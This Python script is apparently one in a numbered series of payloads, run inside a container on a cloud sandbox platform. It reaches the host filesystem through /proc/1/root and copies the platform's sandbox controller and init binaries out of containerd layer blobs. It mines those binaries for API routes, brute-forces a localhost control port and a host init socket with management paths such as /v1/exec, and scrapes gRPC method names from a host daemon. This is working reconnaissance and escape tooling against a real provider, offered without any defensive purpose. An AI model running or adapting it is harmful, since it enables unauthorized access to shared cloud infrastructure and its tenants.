# -*- coding: utf-8 -*-
"""v184 payload: 提取 sandboxctrl/sandbox-init 二进制 + 路由分析 + 23456/init.sock 爆破
由 vda184_guest.py (containerd nopid 容器) 执行, 输出 /vercel/sandbox/v184c.out"""
import socket, struct, time, json, os, signal, re, subprocess, io, tarfile

OUT = '/vercel/sandbox/v184c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(258)


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def http_req(ip, port, path, method='GET', body=b'', t=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        if method == 'GET':
            req = ('GET %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' % path).encode()
        else:
            req = ('POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n'
                   'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
                if len(d) > 2000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:1500]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def unix_req(sockpath, path, method='GET', body=b'', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if method == 'GET':
            req = ('GET %s HTTP/1.1\r\nHost: unix\r\nConnection: close\r\n\r\n' % path).encode()
        else:
            req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
                   'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
                if len(d) > 2000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:1500]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# ============ 1: 提取二进制到沙箱盘 ============
log('=== 1 extract ===')
BLOBS = '/proc/1/root/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256'
try:
    for b in sorted(os.listdir(BLOBS)):
        d = open(os.path.join(BLOBS, b), 'rb').read()
        if d[:2] != b'\x1f\x8b':
            continue
        try:
            tf = tarfile.open(fileobj=io.BytesIO(d), mode='r:gz')
            names = tf.getnames()
            for n in names:
                if n.endswith('sandboxctrl'):
                    x = tf.extractfile(n)
                    if x:
                        dd = x.read()
                        open('/vercel/sandbox/sbctrl.bin', 'wb').write(dd)
                        log('EXTRACT sandboxctrl %d bytes' % len(dd))
                if n.endswith('sandbox-init'):
                    x = tf.extractfile(n)
                    if x:
                        dd = x.read()
                        open('/vercel/sandbox/sbinit.bin', 'wb').write(dd)
                        log('EXTRACT sandbox-init %d bytes' % len(dd))
        except Exception as e:
            log('LAYER EXC %s' % e)
except Exception as e:
    log('EXTRACT EXC %s' % e)

# ============ 2: sandboxctrl 路由分析 ============
log('=== 2 sbctrl routes ===')
try:
    data = open('/vercel/sandbox/sbctrl.bin', 'rb').read()
    log('SBC size=%d' % len(data))
    # 提取 HTTP 路由字符串
    pats = set()
    for mm in re.finditer(rb'"/[A-Za-z0-9_\-/{}.:]+"', data):
        s = mm.group(0)[1:-1]
        if len(s) > 2 and len(s) < 80 and b'//' not in s:
            pats.add(s)
    for p in sorted(pats):
        log('SBC PATH: %r' % p)
    # HandleFunc 相关
    for kw in [b'HandleFunc', b'serveMux', b'http.Handler']:
        for mm in re.finditer(kw, data):
            i = mm.start()
            seg = data[max(0, i - 100):i + 100]
            printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
            if printable * 10 < len(seg) * 4:
                continue
            log('SBC %r @0x%x: %r' % (kw, i, seg))
            break
except Exception as e:
    log('SBC EXC %s' % e)

# ============ 3: sandbox-init 路由分析 ============
log('=== 3 sbinit routes ===')
try:
    data = open('/vercel/sandbox/sbinit.bin', 'rb').read()
    log('SBI size=%d' % len(data))
    pats = set()
    for mm in re.finditer(rb'"/[A-Za-z0-9_\-/{}.:]+"', data):
        s = mm.group(0)[1:-1]
        if len(s) > 2 and len(s) < 80 and b'//' not in s and b'go' not in s[:2]:
            pats.add(s)
    for p in sorted(pats):
        log('SBI PATH: %r' % p)
except Exception as e:
    log('SBI EXC %s' % e)

# ============ 4: 爆破 127.0.0.1:23456 ============
log('=== 4 blast 23456 ===')
paths = ['/', '/health', '/healthz', '/status', '/v1/status', '/api/status', '/metrics',
         '/v1/sandbox', '/sandbox', '/v1/sandbox/status', '/sandbox/status', '/v1/containers',
         '/containers', '/v1/container', '/v1/init', '/v1/lifecycle', '/v1/snapshot',
         '/v1/process', '/v1/cell', '/cell', '/v1/info', '/v1/version', '/version',
         '/v1/ping', '/ping', '/v1/health', '/api/v1/status', '/debug/pprof/', '/v1/logs',
         '/logs', '/v1/events', '/events', '/v1/start', '/v1/stop', '/v1/restart',
         '/v1/exec', '/v1/run', '/v1/mount', '/v1/network', '/v1/dns', '/v1/fs',
         '/v1/snapshot/create', '/v1/runtime', '/v1/runtime/info']
for p in paths:
    st, pay = http_req('127.0.0.1', 23456, p)
    if '404' not in st and 'EXC' not in st:
        log('HIT 23456 %s -> %s %r' % (p, st, pay[:300]))
    else:
        log('MISS %s -> %s' % (p, st))
    time.sleep(0.1)

# ============ 5: 爆破 init.sock ============
log('=== 5 blast init.sock ===')
sp = '/proc/1/root/volumes/run/vercel/share/init.sock'
for p in paths:
    st, pay = unix_req(sp, p)
    if '404' not in st and 'EXC' not in st:
        log('HIT init %s -> %s %r' % (p, st, pay[:300]))
    else:
        log('MISS init %s -> %s' % (p, st))
    time.sleep(0.1)

# ============ 6: cell.sock 完整方法 ============
log('=== 6 methods ===')
try:
    data = open('/proc/1/root/opt/vercel/celld', 'rb').read()
    pats = re.findall(rb'vercel\.hive\.cell\.api\.containers\.v1\.ContainersService/[A-Za-z]+', data)
    uniq = []
    for p in pats:
        s = p.decode(errors='replace')
        if s not in uniq:
            uniq.append(s)
    log('METHODS(%d): %s' % (len(uniq), ' '.join(uniq)))
except Exception as e:
    log('METHODS EXC %s' % e)

log('V184_DONE')
f.close()
